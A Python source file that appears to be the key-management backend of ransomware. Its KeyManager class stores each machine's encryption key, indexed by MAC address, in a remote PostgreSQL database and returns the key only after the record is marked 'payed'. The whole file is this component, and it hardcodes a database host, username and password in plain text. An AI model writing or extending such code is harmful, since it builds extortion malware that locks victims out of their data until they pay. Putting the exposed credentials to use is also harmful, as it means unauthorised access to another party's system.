import psycopg2
from uuid import getnode as get_mac

#sudo apt-get install python3-psycopg2

class KeyManager:


    def __init__(self):
        host = 'balarama.db.elephantsql.com'
        database = 'mtpnwqzr'
        user = 'mtpnwqzr'
        password = 'Il1HouuUVc3ZKpQZ_Cy2mu3WfJ5tIqmR'
        port = '5432'
        try:
            self.connection = psycopg2.connect(user = user,
                                  password = password,
                                  host = host,
                                  dbname = database)
            self.cursor = self.connection.cursor()

        
        except (Exception, psycopg2.Error) as error :
            print ("Error while connecting to PostgreSQL", error)
    
    def insertKey(self, computer_id, key):
        """Inserts key to the database with the computer_id"""

        self.cursor.execute('INSERT INTO "public"."keys"(computer_id, key, payed) VALUES(%s, %s, %s)', (str(computer_id), str(key), "false"))
        self.connection.commit()


    def getKey(self, computer_id):
        """Gets a key from the database with given computer_id"""

        self.cursor.execute('SELECT key FROM "public"."keys" WHERE computer_id = %s AND payed = TRUE', (str(computer_id),))
        data = self.cursor.fetchall()
        if (data != []):
            key = str(data[0][0]) #First row, first column. Should only return one row and column.
            return key
        return ''

    def pay(self, computer_id):
        self.cursor.execute('UPDATE "public"."keys" set payed = true WHERE computer_id = %s', (str(computer_id),)) 
        self.connection.commit()

    def isEncrypted(self, computer_id):
        self.cursor.execute('SELECT * FROM "public"."keys" WHERE computer_id = %s', (str(computer_id),))
        data = self.cursor.fetchall()
        if (data != []):
            return True
        return False

    def removeThisMacFromDB(self):
        self.cursor.execute('DELETE FROM "public"."keys" WHERE computer_id = %s', (str(get_mac()),))
        self.connection.commit()




#k = KeyManager()
#k.insertKey('asdfbasodfdfgadh','1341242367845823')
#key = k.getKey('asdasd')
#print(key)



